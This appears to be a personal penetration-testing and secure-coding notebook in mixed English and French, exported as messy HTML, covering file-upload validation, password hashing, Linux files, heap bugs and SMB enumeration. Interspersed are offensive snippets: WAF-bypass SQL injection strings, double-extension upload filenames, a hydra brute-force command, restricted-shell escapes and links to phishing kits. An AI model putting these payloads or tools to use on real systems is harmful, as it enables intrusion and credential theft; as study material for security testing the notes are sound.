<li>Ensure the usage of business-critical extensions only, without allowing any type of non-required extensions. For example if the system requires:  
<ul>
  
<li>Image upload, allow one type that is agreed upon to fit the business requirement.
  
<li>Cv upload, allow docx and pdf extensions.
<ul>

<li>Content-Type Validation 
<ul>
 
<li>Other than defining the extension of the uploaded file, its MIME-type can be checked for a quick protection against simple file upload attacks. 
<ul>
 
<li>This can be done preferably in an allow list approach
<ul>

<li>File Signature Validation 
<ul>
 
<li>In conjunction with content-type validation, validating the file's signature can be checked and verified against the expected file that should be received.
            This should not be used on its own, as bypassing it is pretty common and easy.
<ul>

<li>Filename Sanitization 
<ul>
 
<li>Creating a random string as a file-name, such as generating a UUID/GUID, is essential. 
<ul>
 
<li>If user filenames are required, consider implementing the following:  
<ul>
  
<li>Implement a maximum length  
<ul>
  
<li>Restrict characters to an allowed subset specifically, such as alphanumeric characters, hyphen, spaces, and periods.
<ul>

<li>File Content Validation 
<ul>
 
<li>Based on the expected type, special file content validation can be applied:  
<ul>
  
<li>For images, applying image rewriting techniques destroys any kind of malicious content injected in an image; this could be done through randomization.  
<ul>
  
<li>ZIP files are not recommended since they can contain all types of files, and the attack vectors pertaining to them are numerous.
<ul>

<li>File Storage Location 
<ul>
 
<li>The following points are set by security priority, and are inclusive:  
<ul>
  
<li>Store the files on a different host  
<ul>
  
<li>Store the files outside the webroot, where only administrative access is allowed or inside the webroot, and set them in write permissions only.  
<ul>
  
<li>Set the files permissions on the principle of least privilege
<ul>

<li>Upload and Download Limits 
<ul>
 
<li>The application should set proper size limits for the upload service in order to protect the file storage capacity. 
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
    -
   </td>
  </tr>
  <tr>
   <td>
    -
   </td>
  </tr>
  <tr>
   <td>
    -
   </td>
  </tr>
  <tr>
   <td>
<img src="images/image219.png" width="" alt="alt_text" title="image_tooltip">

   </td>
  </tr>
</table>


<ul>

<li>Password Storage
</li>
</ul>

<table>
  <tr>
   <td>
<ul>

<li>Passwords should be hashed, NOT encrypted.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Salt should be unique per user.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Salt is used to : 
<ul>
 
<li>Increase the time consumed in brute force or Dictionary attack
<ul>

<li>Against rainbow-table 
<ul>
 
<li>Salting also means that it is impossible to determine whether two users have the same password 
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Modern hashing algorithms such as Argon2id, bcrypt, and PBKDF2 automatically salt the passwords, so no additional steps are required when using them.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Peppering : 
<ul>
 
<li>A pepper can be used in addition to salting to provide an additional layer of protection. The purpose of the pepper is to prevent an attacker from being able to crack any of the hashes if they only have access to the database.
<ul>

<li>One of several peppering strategies (there are multiples strategies in peppering) is to hash the passwords as usual (using a password hashing algorithm) and then HMAC or encrypt the hashes with a symmetrical encryption key before storing the password hash in the database, with the key acting as the pepper.
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Work Factors : 
<ul>
 
<li>The work factor is essentially the number of iterations of the hashing algorithm that are performed for each password (usually, it's actually <em>2^work</em> iterations).
        The purpose of the work factor is to make calculating the hash more computationally expensive.
<ul>

<li>When choosing a work factor, a balance needs to be struck between security and performance.
<ul>

<li>There is no golden rule for the ideal work factor - it will depend on the performance of the server and the number of users on the application. Determining the optimal work factor will require experimentation on the specific server(s) used by the application. As a general rule, calculating a hash should take less than one second.
<ul>

<li>One key advantage of having a work factor is that it can be increased over time as hardware becomes more powerful and cheaper.
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>International Characters :
        Ensure your hashing library is able to accept a wide range of characters and is compatible with all Unicode codepoints.
<p>

        Password hashing libraries need to be able to use input that may contain a NULL byte.
<p>

        Users should be able to use the full range of characters available on modern devices, in particular mobile keyboards.
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<img src="images/image220.png" width="" alt="alt_text" title="image_tooltip">

   </td>
  </tr>
</table>


<ul>

<li>MISC
<h5>
                      MISC checklist</h5>


</li>
</ul>

<table>
  <tr>
   <td>
<ul>

<li>Everytime that you see something that can be controlled by an attacker joined with a system path, make sure to prevent Directory Transversal attack
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>When you are doing a signature verification or a cryptographic data verification, make sure that the comparison is done in constant time regardless of the similarity in the values compared ( to avoid brute force ( time ) blind attack character per character ) . 
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li>Que signifie FIPS ? 
<ul>
 
<li>L’acronyme FIPS renvoie à « Federal Information Processing Standards » (normes fédérales de traitement de l’information). 
        La série de normes FIPS 140 correspond aux normes de sécurité informatique établies par le National Institute of Standards & Technology (NIST) pour le gouvernement des États-Unis.
</li> 
</ul>
</li> 
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>Different general and direct way for WAF bypasses : 
<ul>
 
<li>URL encode / Double URL encode ( ‘ => %27 ou %2527 ) 
<ul>
 
<li>HTML encode ( ‘ => &#x27; ou &#x00027; ou &apos; ou &#39; )
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
<ul>

<li>Caractère espace => /**/ ( commentaire vide avec une syntaxe selon le contexte)
</li>
</ul>
<ul>

<li>Breaking restriction in sensitive word like this :  
<ul>
 
<li>/**/UN/**/ION/**/SEL/**/ECT …
 
<li>uni*on sel*ect
 
<li>uNiOn ALl sElEcT .. ( Change cases )
 
<li>UnIoN SeLselectECT …. ( against str_replace )
</li> 
</ul>
</li> 
</ul>
<ul>

<li>Adding CRLF in some places ( %0A%0D ):  
<ul>
 
<li>%0A%0Dunion%0A%0D+%0A%0D+%0A%0Dselect+%0A%0D+1,2,3,4,5+--+-
</li> 
</ul>
</li> 
</ul>
<p>

<img src="images/image221.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image222.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Attention de ne pas laisser des fichiers sensible pouvant être lue ( visible par l’URL ) dans le serveur par exemple :</strong> 
<ul>
 
<li><strong>Exemple fichiers :</strong>  
<ul>
  
<li><strong>Fichiers se finissant par “~” ( type de fichier temporaire backup ).</strong>  
<ul>
  
<li><strong>Fichiers de backup : *.[bak - backup - tmp - gho]. Il en existe beaucoup.Tout dépends du système utilisé.</strong>  
<ul>
  
<li><strong>Fichiers d’installation de framework php.</strong>  
<ul>
  
<li><strong>Fichier .git. ( extraction with GitTool ) ou .svn ( subversion )</strong>
<ul>

<li><strong>Dû aux différentes manières de comparer une chaîne de caractère au nouveau code back-end et base de donnée, on peut tenter de créer un compte admin avec le même nom de compte mais avec des majuscule/minuscule échangés pour obtenir ses droits. </strong>
<p>

        <strong>La base de données ne va pas faire la différence entre “admin” et  “AdMIN” par exemple. Ou pareil pour “admin” et “admin    ”.</strong>
</p>
<ul>

<li><strong>Si une redirection est effectuée ( sur une page ), toujours look les infos retournées par le serveur dans les requêtes réponses intermédiaires.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>A Classic mistake with modern frameworks : Here most of the code is generated automatically and access to different formats (HTML, JSON) for the same database record is also done automatically.</strong>
<p>

        <strong>For example, by accessing /users/1, you will see an HTML page with the first user's details. crucial information has been masked.</strong>
</p>
<p>

        <strong>Fortunately, you should be able to access the JSON representation of this information details by modifying the URL ( /users/1.json ).</strong>
</p>
<ul>

<li><strong>In LDAP server ( Database ), if NULL bind is configured, you can connect to the DB without credentials ( just with NULL values, removing the username and password POST parameters ). </strong>
<p>

        <strong>It’s what we call a bind connection ( with less privileges than a common user ).</strong>
</p>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>Serving requests for a single application can be done by multiple backends. It can pay off to send the same request multiple times to check if multiple backends are involved.</strong>
</li>
</ul>
<ol>

<li><strong>TXT records ( in DNS ) are often used to show that people own a domain or to store information to configure services, it's always a good idea to check for those. </strong>
<p>

    <strong>It's sometimes possible to retrieve information from internal zones by asking publicly available servers.</strong>
</p>
<ul>

<li><strong>The idea behind chunk-encoding ( with the header <em>Transfer-encoding: chunked </em>) is that the server can send content without waiting for the full response to be ready. The server sends the size of a chunk (in hexadecimal) followed by the chunk.</strong>
<p>


<img src="images/image223.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>La méthode HTTP HEAD demande les en-têtes qui seraient retournés si la ressource spécifiée était demandée avec une méthode HTTP GET. Une telle requête peut être envoyée avant de procéder au téléchargement d'une  ressource volumineuse, par exemple pour économiser de la bande passante.
</li>
</ul>
</li>
</ul>
</li>
</ol>
<ul>

<li>Filter input against “Directory traversal attack” ( exemple : str_replace ça : “../” ).
</li>
</ul>
<ul>

<li>Faire attention à gérer tous les types de requêtes reçues ( pas que GET et POST ) dans le code du serveur : HEAD, PUT, DELETE, CONNECT, TRACE, PATCH, OPTIONS. 
</li>
</ul>
<ul>

<li>Filtrer les 2 caractères CRLF (“\r\n”) sur les champs sensibles à ce genre d’attaque (avec un “str_replace” par exemple).
</li>
</ul>
<ul>

<li>Lors de l’upload de fichier (des images par exemples), faire attention à l’attaque du “double extension” or “different extension.
<p>

                Exemple : 
</p>
<ul>

<li>shell.php.png ou shell.php%00.png&lt;-( null-byte attack) (fichier php déguisé en png).
<ul>

<li>shell.php3 which will bypass a simple filter on .php
<ul>

<li>shell.php.test which will bypass a simple filter on <em>.php</em> and Apache will still use <em>.php</em> since in this configuration it doesn't have an handler for <em>.test</em>.
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>
<p style="text-align: right">

<img src="images/image224.png" width="" alt="alt_text" title="image_tooltip">
</p>

</p>
<p>

            Faire aussi attention à vérifier si la valeur header Content-Type est bonne. Il peut être utilisé par un attaquant pour faire croire que le fichier envoyé est du type qu’il indique lui-même dans la requête alors que ce n’est pas le cas.
</p>
<ul>

<li>The HTTP TRACE method is designed for diagnostic purposes. If enabled, the web server will respond to requests that use the TRACE method by echoing in the response the exact request that was received.
<p>

             
</p>
<p>

            This behavior is often harmless, but occasionally leads to information disclosure, such as the name of internal authentication headers that may be appended to requests by reverse proxies.
</p>
</li>
</ul>
<ul>

<li>it is worth trying to navigate to /robots.txt or /sitemap.xml manually to see if you find anything of use in web gathering information. it's always a good idea visit all the pages that are "disallowed" to find sensitive information.
<ul>

<li>The Same-Origin Policy is one of the fundamental defenses deployed in modern web applications. It restricts how a script from one origin can interact with the resources of a different origin. It is critical in preventing a number of common web vulnerabilities.
<p>

            The same-origin policy is a web browser security mechanism that aims to prevent websites from attacking each other.
</p>
<ul>

<li>Attention à utiliser la fonction “assert()” et “eval()” sur un input utilisateur ( et peut-être même en général ). Un utilisateur malveillant peut injecter du code que “assert” exécutera.
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>

<li>Pour accéder à certains fichiers, lorsque l’on connaît leurs localisation, l’utilisation des liens symboliques peut être efficace pour bypasser certains protections ( différente extension que le fichier d’origine etc …).
</li>
</ul>
<ul>

<li>Make sure that when building a signature, it can’t be reused itself in another component in the application.
</li>
</ul>
<p>

<img src="images/image225.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image226.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ol>

<li> Javascript security
</li>
</ol>
<ul>

<li>CDN in JS:
<h4>
Description</h4>


<p>

<strong>It is common to fetch JavaScript and style sheet libraries from third-party providers as it offers a variety of advantages, not least of which is the ability to leverage someone else's hosting infrastructure. But this also extends the overall attack surface, in that if the above mentioned provider is compromised, an attacker might inject malicious code into the hosted libraries, thus transforming a single-entity compromise into a massive supply-chain catastrophe, impacting every web application reliant on the tainted libraries in question.</strong>
</p>
<p>


<img src="images/image227.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h4>
Impact</h4>


<p>

<strong>Let's say a third-party provider like a Content Delivery Network (CDN) is compromised. Not checking the SRI could result in an attacker executing arbitrary code in the context of the web application with the impact only limited to what the web application can legitimately do.</strong>
</p>
<p>


<img src="images/image228.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Incorrect Referrer Policy :
<p>

<strong>Suppose that some legitimate web application allows untrusted users to add external links in one of its pages, for example:</strong>
</p>
<p>


<img src="images/image229.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>


<img src="images/image230.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ol>

<li> ClickJacking

<li>prevention
</li>
</ol>
</li>
</ul>
</li>
</ul>
<p>

<img src="images/image231.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Preventing session cookies from being included when the page is loaded in a frame using the SameSite cookie attribute.
<ul>

<li>Implementing JavaScript code in the page to attempt to prevent it being loaded in a frame (known as a "frame-buster").
</li>
</ul>
</li>
</ul>
<p>

<img src="images/image232.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ol>

<li> Linux
</li>
</ol>
<ul>

<li>/etc/passwd file :  
<ul>
 
<li><strong>It stores user account information.</strong>
</li> 
</ul>
</li> 
</ul>
<p>
<strong>			</strong>
</p>
<ul>

<li><strong>One entry per line for each user.</strong> 
<ul>
 
<li><strong>It should have general read permission for many </strong>
<p>

                <strong>command utilities but write access only for admin.</strong>
</p>
</li> 
</ul>
</li> 
</ul> 
<ul>
 
<li><strong>Syntax :</strong>
<p>

    <strong>			Example with this line : root:x:0:0:root:/root:/bin/bash</strong>
</p>
<ul>

<li><strong>root: : username used when user logs in. It should be between 1 and 32 characters in length.</strong>
<ul>

<li><strong>:x: : Indication for password : an x character indicates that encrypted password is stored in /etc/shadow file. </strong>
<ul>

<li><strong>:0: : User ID (UID): Each user must be assigned a user ID. UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.</strong>
<ul>

<li><strong>:0: : Group ID (GID): The primary group ID (stored in /etc/group file)</strong>
<ul>

<li><strong>:root: : User ID Info: The comment field. It allows you to add extra information about the users ( user’s full name, phone number, …). </strong>
<p>

                <strong>This field is used by finger command for</strong>
</p>
<p>

                <strong>fetching.</strong>
</p>
<ul>

<li><strong>:/root: : Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exist then users directory becomes /.</strong>
<ul>

<li><strong>:/bin/bash: : Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3>
    Some Environment variables in Linux:</h3>



<table>
  <tr>
   <td><strong>LD_LIBRARY_PATH</strong>
   </td>
   <td><strong>Indicates differents directories to search for libraries. </strong>
   </td>
  </tr>
  <tr>
   <td><strong>LD_PRELOAD</strong>
   </td>
   <td><strong>Specify a library which will be loaded prior to any library when the program gets executed.</strong>
   </td>
  </tr>
</table>


<ul>

<li>Fonctionnement de la HEAP ( glibc heap ):
</li>
</ul> 
<ul>
 
<li><strong>The way the heap works is very platform and implementation specific ( example : The default <em>glibc </em>heap implementation in <em>Linux </em>is also very different to how the heap works in <em>Windows )</em></strong>
</li> 
</ul>
<p>
<strong>				</strong>
</p>
<ul>

<li>Some basic HEAP rules:

<table>
  <tr>
   <td>
<strong>Rule</strong>
</li>
</ul>
   </td>
   <td><strong>Can lead to ...</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Don’t read or write to a pointer returned by malloc ( and like-malloc functions ) after that pointer has been passed back to free</strong>
   </td>
   <td><strong>Use After Free</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Don’t use or leak uninitialized information in a heap allocation ( Exception for calloc ).</strong>
   </td>
   <td><strong>Information leaks , uninitialized data Vuln.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Don’t read or write bytes after the end of an allocation.</strong>
   </td>
   <td><strong>Heap overflow, read beyond bounds Vuln.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Don’t pass a pointer that originated from malloc ( and like-malloc functions ) to free more than one.</strong>
   </td>
   <td><strong>Double Free Vuln.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Don’t read or write bytes before the beginning of an allocation.</strong>
   </td>
   <td><strong>Heap underflow Vuln.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Don’t pass a pointer that didn’t originate from malloc to free.</strong>
   </td>
   <td><strong>Invalide free Vuln.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Don’t use a pointer returned by malloc ( and like-malloc functions ) before checking if the function returned NULL.</strong>
   </td>
   <td><strong>Null-dereference bugs</strong>
<p>
<strong>arbitrary write Vuln</strong>
   </td>
  </tr>
</table>


<h4>		Spécification :</h4>


<ul>

<li><strong>The heap manager also needs to store metadata about the allocation.</strong>
</li>
</ul>
<p>

<img src="images/image233.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>The heap manager also needs to ensure that the allocation will be 8-byte aligned on 32-bit systems, or 16-byte aligned on 64-bit systems. So some paddings bytes are stored when it’s needed.</strong>
</li>
</ul>
<p>

                <strong>Many functions ( like “system” or “exec” in C) can drop Setuid privilege for security reasons.</strong>
</p>
<h3>			  Some important file in Linux system</h3>



<table>
  <tr>
   <td><strong>.[ sh | zsh | ksh | bash ]rc</strong>
   </td>
   <td><strong>Provide a place where you can set up variables, functions and aliases, define your prompt and define other settings that you want to use every time you open a new terminal window.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>.[ sh | zsh | ksh | bash ]_profile</strong>
   </td>
   <td><strong>Comme .[]rc, sauf qu’il est exécuté pour les login shell, c'est à dire là où vous saisissez votre login et mot de passe. </strong>
<p>
<strong>C'est par exemple le cas lors de votre première connexion au démarrage de votre machine ou lors d'une connexion SSH.</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>SMB Penetration Testing (Port 445)
</li>
</ul>
<ul>

<li>Le logiciel Samba est un outil permettant de partager des dossiers et des imprimantes à travers un réseau local. Il permet de partager et d'accéder aux ressources d'autres ordinateurs fonctionnant avec d’autres systèmes d'exploitation dans lesquels une implémentation de Samba est installée.
<p>

    Il implémente le protocol SMB ( Server Message Block ) ( port 139 et 445 ).
</p>
<p>

    Some Bamba command
</p>

<table>
  <tr>
   <td>
smbclient  \\\\[IP]\\sambashare
</li>
</ul>
   </td>
   <td>Find the shares which we can access without creds
   </td>
  </tr>
  <tr>
   <td>get [NAME_FILE]
   </td>
   <td>Une fois rentré dans les fichiers partagés ,on peut récupérer un fichier avec cette commande.
   </td>
  </tr>
  <tr>
   <td>smbclient //[IP]/LOCUS_LAN$
   </td>
   <td>Accède au fichier “LOCUS_LAN”
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>
<strong>The SMB protocol supports two levels of security. The first is the share level. The server is protected at this level and each share has a password. The client computer or user has to enter the password to access data or files saved under the specific share.</strong>
</p>
<p>
<strong>During the enumeration phase ( of this functionality ), generally, we go for banner grabbing to identify a vulnerable version of the running service and the host operating system. You can do this via nmap :</strong>
</p>
<p>

<img src="images/image234.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>There are so many automated scripts and tools available for SMB enumeration.</strong>
</p>
<p>
<strong>If you get fail to enumerate the vulnerable state of SMB or found a patched version of SMB in the target machine, then we have “Brute force” as another option to gain unauthorized access to a remote machine.</strong>
</p>
<p>

<img src="images/image235.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>hydra -L user.txt -P pass.txt 192.168.1.101 smb</strong>
</p>
<p>

<img src="images/image236.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h3>					  Phishing tools</h3>



<table>
  <tr>
   <td><strong>AdvPhising</strong>
   </td>
   <td><strong>https://github.com/Ignitetch/AdvPhishing</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Shellphish</strong>
   </td>
   <td><strong>https://github.com/kaankadirkilic/shellphish-1</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Evilginx2</strong>
   </td>
   <td><strong>https://github.com/kgretzky/evilginx2</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>
<strong>					</strong>
</p>
<h3>				       File System in Linux</h3>



<table>
  <tr>
   <td>
<ul>

<li><strong>/</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Every single file and directory starts from this root directory.</strong>
<ul>

<li><strong>Only the root user has write privilege under this directory.</strong>
<ul>

<li><strong>Please note that /root is the root user’s home directory, which is not the same as /.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/bin</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Contains binary executables.</strong>
<ul>

<li><strong>Common linux commands you need to use in single-user modes are located under this directory.</strong>
<ul>

<li><strong>Commands used by all the users of the system are located here.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/sbin</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Just like /bin, /sbin also contains binary executables.</strong>
<ul>

<li><strong>But, the linux commands located under this directory are used typically by system administrators, for system maintenance purposes ( ipatables, ifconfig,...).</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/etc</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Contains configuration files required by all programs.</strong>
<ul>

<li><strong>This also contains startup and shutdown shell scripts used to start/stop individual programs.</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/dev</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Contains device files.</strong>
<ul>

<li><strong>These include terminal devices, usb, or any device attached to the system.</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/proc</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Contains information about system process.</strong>
<ul>

<li><strong>This is a pseudo file system containing information about running process ( /proc/{pid} )...</strong>
<ul>

<li><strong>This is a virtual filesystem with text information about system resources.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/var</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>“var” stands for <em>variable files</em>.</strong>
<ul>

<li><strong>Content of the files that are expected to grow can be found under this directory.</strong>
<ul>

<li><strong>This includes :</strong> 
<ul>
 
<li><strong>System log file (/var/log)</strong> 
<ul>
 
<li><strong>Packages and database files (/var/lib) </strong> 
<ul>
 
<li><strong>Emails (/var/mail)</strong>
<ul>

<li><strong>Temp files needed across reboots (/var/tmp)</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/tmp</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Directory that contains temporary files created by system and users.</strong>
<ul>

<li><strong>Files under this directory are deleted when the system is rebooted.</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/usr</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Contains binaries, libraries, documentation, and source-code for second level programs.</strong>
<ul>

<li><strong>/usr/bin contains binary files for user programs. If you can’t find a user binary under /bin, look under /usr/bin ( same as /sbin and /usr/sbin ).</strong>
<ul>

<li><strong>/usr/lib contains libraries for /usr/bin and /usr/sbin</strong>
<ul>

<li><strong>/usr/local contains users programs that you install from source. For example, when you install apache from source, it goes under /usr/local/apache2</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/home</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Home directories for all users to store their personal files.</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/boot</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Contains boot loader related files.</strong>
<ul>

<li><strong>Kernel initrd, vmlinux, grub files are located under /boot</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/lib</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Contains library files that supports the binaries located under /bin and /sbin</strong>
<ul>

<li><strong>Library filenames are either ld* or lib*.so.*</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/opt</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>“opt” stands for optional.</strong>
<ul>

<li><strong>Contains add-on applications from individual vendors.</strong>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/mnt</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Temporary mount directory where sysadmins can mount filesystems.</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/media</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>Temporary mount directory for removable devices.</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
<ul>

<li><strong>/srv</strong>
</li>
</ul>
   </td>
   <td>
<ul>

<li><strong>“srv” stands for service.</strong>
<ul>

<li><strong>Contains server specific services related data.</strong>
<ul>

<li><strong>For example, /srv/cvs contains CVS related data.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li><strong>le dossier ﻿/<em>dev</em>/<em>input</em>/ est liée aux inputs de tous les devices extérieures connectés ( souris, clavier, …)</strong>
</li>
</ul>
<ul>

<li><strong>Sur une machine Ubuntu, un message de bienvenue accueille l'utilisateur lors d'une connexion en ligne de commande (SSH) .</strong>
</li>
</ul>
<p>
<strong>Ce message est nommé le message du jour (motd).</strong>
</p>
<p>
<strong>Si on obtient les droits d’écritures sur le répertoire liée à ce </strong>
</p>
<p>
<strong>système, on peut prendre le contrôle de l’utilisateur root.</strong>
</p>
<ul>

<li>Shell restreint
</li>
</ul>
<p>
<strong>Un shell restreint (restricted shell) est un shell système, modulable de</strong>
</p>
<p>
<strong>sorte à restreindre les possibilités des utilisateurs. Un tel shell est utilisé</strong>
</p>
<p>
<strong>en général au moment où l'administrateur doit créer un compte pour un</strong>
</p>
<p>
<strong>utilisateur à qui il ne fait pas complètement confiance.</strong>
</p>
<p>
<strong>La plupart des programmes n'ont pas hélas été écrits pour travailler avec</strong>
</p>
<p>
<strong>les shells restreints ( telnet, mail, ftp, less, more, vi, gdb, lynx ). Certains </strong>
</p>
<p>
<strong>d'entre eux contiennent une fonction intégrée, permettant d'appeler le shell</strong>
</p>
<p>
<strong>normal (shell escape). Cette fonction est en général appelée à l'aide du </strong>
</p>
<p>
<strong>caractère “ <em>!</em> ”.</strong>
</p>
<p>
<strong>Nous pouvions nous attendre à ce que les commandes transférées soient</strong>
</p>
<p>
<strong>exécutées en se basant sur le shell défini dans la variable SHELL – dans </strong>
</p>
<p>
<strong>notre cas /bin/rbash. Hélas, ce n'est pas toujours le cas. Une partie de ces </strong>
</p>
<p>
<strong>programmes ne tient pas compte des variables d'environnement et ils </strong>
</p>
<p>
<strong>exécutent les commandes transférées à l'aide du shell /bin/bash ou bien </strong>
</p>
<p>
<strong>/bin/sh.</strong>
</p>
<p>
<strong>L’escape passe parfois par le modification de la variable d'environnement</strong>
</p>
<p>
<strong>$SHELL ( en /bin/bash ).</strong>
</p>
<ul>

<li><strong>Modifier les droits des fichiers et des répertoires</strong>
</li>
</ul>
<p>
<strong>	Si l'administrateur se trompe et rend disponible la commande chmod, il se</strong>
</p>
<p>
<strong> 	peut que l'utilisateur attribue le droit +w au répertoire personnel, ce qui</strong>
</p>
<p>

    <strong>l'autorisera à supprimer le fichier .bash_profile. À la prochaine connexion, la variable PATH ne sera pas restreinte à /usr/local/rbin et donc il est fort probable que le chemin contiendra le répertoire /bin (ce qui permettra de lancer le bash normal).</strong>
</p>
<p>

    <strong>Il est parfois possible de modifier les droits sans utiliser le programme /bin/chmod ( par exemple avec FTP, si on a accès à ce service, l'utilisateur peut faire la commande chmod 777 après s'être connecté au port 21 pour supprimer facilement le fichier .bash_profile ou l'écraser avec un autre.. )</strong>
</p>
